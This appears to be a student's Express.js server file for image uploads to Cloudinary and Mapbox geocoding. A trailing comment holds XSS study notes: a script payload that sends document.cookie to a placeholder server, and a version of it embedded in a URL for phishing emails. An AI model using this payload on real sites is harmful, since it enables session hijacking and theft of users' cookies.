if (process.env.NODE_ENV !== "production") {
  require("dotenv").config();
}

//console.log(process.env.CLOUDNAME); // envs are not case-sensitive

const express = require("express");
const app = express();
const path = require("path");
const multer = require("multer");
const { storage } = require("./Cloudinary");
require("./db");
const imgModel = require("./models/imgModel");
const geoModel = require("./models/geoModel");

const mbxGeocoding = require("@mapbox/mapbox-sdk/services/geocoding");
const token = process.env.MAPBOXTOKEN;

app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "/views"));

app.use(express.urlencoded({ extended: true }));

// for uploading to cloudinary
const upload = multer({ storage });

/* 
    // this one for local upload
const upload = multer({ dest: "uploads/" });

*/

app.get("/", (req, res) => {
  res.render("home");
});

app.get("/upload", (req, res) => {
  res.render("imgUpload.ejs");
});

// upload . single for single img ... &   uplaod.arraay for multiple imgs
app.post("/upload", upload.array("img"), async (req, res) => {
  console.log(req.body, req.files);

  for (i in req.files) {
    const SaveImg = imgModel({
      uploader: req.body.name,
      imgName: req.files[i].filename,
      imgUrl: req.files[i].path,
    });
    await SaveImg.save();
  }

  // res.send(req.files);
  res.redirect("/display");
});

app.get("/display", async (req, res) => {
  const imgs = await imgModel.find();
  console.log(imgs);
  res.render("imgDisplay", { imgs });
});

app.get("/map", (req, res) => {
  res.render("locationForm");
});

const geocoder = mbxGeocoding({ accessToken: token });

app.post("/getloc", async (req, res) => {
  const { us, loc } = req.body;

  const geo = await geocoder
    .forwardGeocode({
      query: loc,
      limit: 1,
    })
    .send();

  const geometry = geo.body.features[0].geometry;
  const geoSave = geoModel({
    user: us,
    location: loc,
    geometry: geometry,
  });

  await geoSave.save();
  // res.send(geo.body.features[0].geometry.coordinates);
  const coordinates = geometry.coordinates;
  res.render("displayMap", { coordinates, loc });
});

app.listen(3000, () => console.log("listening on port 3000"));

/*  
    XSS eg :

    // whenever we set src() to an image the browser will send a request to that URL;
    <script>  new Image.src() = "myserver/getData?data="+document.cookie;</script>

    // also , such URLs are used in emails , to grab users data; , URL shortneres are used to beautify them
    aserver.com?datasent=<script> new Image.src() = "myserver/getData?data="+document.cookie;</script>


*/
